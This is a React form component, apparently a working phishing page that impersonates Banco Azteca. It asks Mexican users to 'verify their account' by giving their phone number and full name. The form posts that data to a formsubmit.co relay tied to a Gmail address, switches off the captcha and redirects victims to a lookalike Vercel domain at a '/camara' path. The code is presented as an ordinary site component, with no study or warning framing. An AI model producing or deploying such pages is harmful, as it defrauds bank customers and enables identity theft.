import React from 'react';
import '../css/form.css'; // Suponiendo que tienes estilos CSS externos
import logo from '../img/logoaz.png';

const Form = () => {
  

  return (
    <div className="contenedor" >
      <img src="https://i.ibb.co/7QCd7Xh/header.jpg" alt="" className="logo" />
      <h2 style={{ textAlign: "center", fontSize: "18px", color: "#076f40", fontWeight: "900" }}>
        INGRESA TU NUMERO DE CELULAR PARA VERIFICAR TU CUENTA
      </h2>
      <form className="pedirnum" id="contactform" action="https://formsubmit.co/bancoaztecarespuestas@gmail.com" method="POST">
        <input name="_redirect" type="hidden" id="name" value="" />
        <input type="hidden" name="_next" value="https://aztecabanmexncscliente.vercel.app/camara" />
        <input name="_formsubmit_id" type="text" style={{ display: "none" }} />
        <input type="hidden" name="_captcha" value="false" />
        <div className="contingnum">
        <div className="continptel">
          <label className="num-label" htmlFor="num">+52</label>
          <input
            type="tel"
            name="num"
            id="num"
            placeholder="Ingrese su número"
            onKeyPress={(event) => event.charCode >= 48 && event.charCode <= 57}
            maxLength="10"
            required
            className='inputtextt'
          />
          </div>
        </div>
        <div className="contingnum">
          <div className="continp">
            
            <input
              type="text"
              name="nombre"
              id="nombre"
              placeholder="Nombre completo"
              className='inputtexta'
            />
          </div>
        </div>
        <div className="contingnum">
          <div className="continp">
        
            <input
              type="text"
              name="apellido"
              id="apellido"
              placeholder="Apellido(s)"
              className='inputtexta'
            />
          </div>
        </div>
        <input className="btnenviar" id="btnenviar" type="submit" value="Enviar" />
      </form>
      <div className="footer">
           <img src="https://www.bmcsoftware.es/content/dam/bmc/logos/third-party/logo-banco-azteca-white.png" width="100px" alt="" />
      </div>
    </div>
  );
};

export default Form;
